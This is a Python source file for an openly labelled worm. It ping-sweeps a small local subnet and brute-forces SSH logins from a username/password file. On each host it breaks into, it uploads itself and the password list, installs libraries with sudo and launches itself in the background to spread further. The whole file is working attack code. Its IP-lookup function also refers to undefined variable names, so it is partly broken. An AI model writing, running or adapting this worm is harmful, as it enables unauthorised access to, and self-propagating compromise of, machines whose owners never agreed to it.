#!/usr/bin/env python

import paramiko
import sys
import os
import netifaces
import subprocess 
import time
import logging

##################################################################
# Function that will ping all IP addresses within the given range and
# store all IP addresses that responded
# @return - A list of all responding IP addresses withing the range
##################################################################
def get_list_of_hosts():
	hostlist = []
	my_IP_address = get_current_IP_address('en0')
	FNULL = open(os.devnull, 'w')

	#Loop trough 10 different IP's and check if any one of them respons. 
	for ping in range(1,10): 
	    address = "192.168.2." + str(ping) 

	    #Don't ping my own IP
	    if(address != my_IP_address):
	    	#Do a ping and turn of output to console
	    	res = subprocess.call(['ping', '-c', '3', address],stdout=FNULL, stderr=subprocess.STDOUT) 
	    	if res == 0: 
	    		hostlist.append(address)
	return hostlist

##################################################################
# Function that will try to establish a ssh connection trying different combinations of usernames and passwords.
# If a connection is valid then it will call the UploadFileAndExecute function
##################################################################
def Attack_SSH(ipAddress) :
	logging.info("Attacking Host : %s " %ipAddress)
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# For each username and password combination try to establish a connection. 
	for line in open("./passwords.txt", "r").readlines() :
		[username, password] = line.strip().split()

		try :
			logging.info("Trying with username: %s password: %s " % (username, password))
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect(ipAddress, username=username, password=password)

		except paramiko.AuthenticationException:
			logging.info("Failed...")
			continue 
		
		logging.info("Success ... username: %s and passoword %s is VALID! " % (username, password))
		UploadFileAndExecute(ssh)
		break

##################################################################
# Open a SSH File Transfer Protocol, and transfer worm files to the reciving machine.
# Once all the files are uploaded, it will install the nessesary libraries and run the worm.
##################################################################
def UploadFileAndExecute(sshConnection) :
	print("Upload files to connection...")
	sftpClient = sshConnection.open_sftp()

	# Create folder to store worm files in
	stdin, stdout, stderr = sshConnection.exec_command("mkdir /tmp/worm") 
	stdout.channel.recv_exit_status() # Blocking call     
	logging.info("Created folder /tmp/worm")
   
	# Replicate worm files
	sftpClient.put("./replicator.py", "/tmp/worm/" + "./replicator.py")
	logging.info("Added replicator.py")

	sftpClient.put("./passwords.txt", "/tmp/worm/" +"./passwords.txt")
	logging.info("Added passwords.txt")

	logging.info("Installing python3-pip")
	# Install python pip
	stdin, stdout, stderr = sshConnection.exec_command("sudo apt -y install python3-pip")  
	stdout.channel.recv_exit_status() 
	logging.info("Finished installing python3-pip")
  
	
	# Install paramiko
	logging.info("Installing paramiko")
	stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python-paramiko")  
	stdout.channel.recv_exit_status()   
	logging.info("Finished installing paramiko")

	# Install netifaces
	logging.info("Installing netifaces")
	stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python-netifaces")  
	stdout.channel.recv_exit_status()   
	logging.info("Finished installing netifaces")

	stdin, stdout, stderr = sshConnection.exec_command("chmod a+x /tmp/worm/" +"replicator.py")  
	stdout.channel.recv_exit_status()   

	stdin, stdout, stderr = sshConnection.exec_command("nohup python /tmp/worm/" +"replicator.py passwords.txt"+ " &")  
	stdout.channel.recv_exit_status()   



##################################################################
# Function that retrives the IP address for the current machine.
# @ return - IP address 
##################################################################
def get_current_IP_address(interface):
        # Get all the network interfaces on the system
        network_interfaces = netifaces.interfaces()
        ip_Address = None

        # Loop through all the interfaces and get IP address
        for netFace in networkInterfaces:

            # The IP address of the interface
            try:
                addr = netifaces.ifaddresses(netFace)[2][0]['addr']
            except:
                continue

            if not addr == "127.0.0.1":
                ip_Address = addr
        return ipAddr



if __name__ == "__main__" :
	logging.basicConfig(filename='worm.log',level=logging.DEBUG)
	logging.getLogger("paramiko").setLevel(logging.WARNING)
	logging.info('Staring worm...')

	hostlist = get_list_of_hosts()
	list_string = str(hostlist)
	logging.info("Available hosts are: " + list_string)

	#Loop trough the list of all responding IP's and try to connect with ssh
	for host in hostlist:
		Attack_SSH(host)
	logging.info("Done")
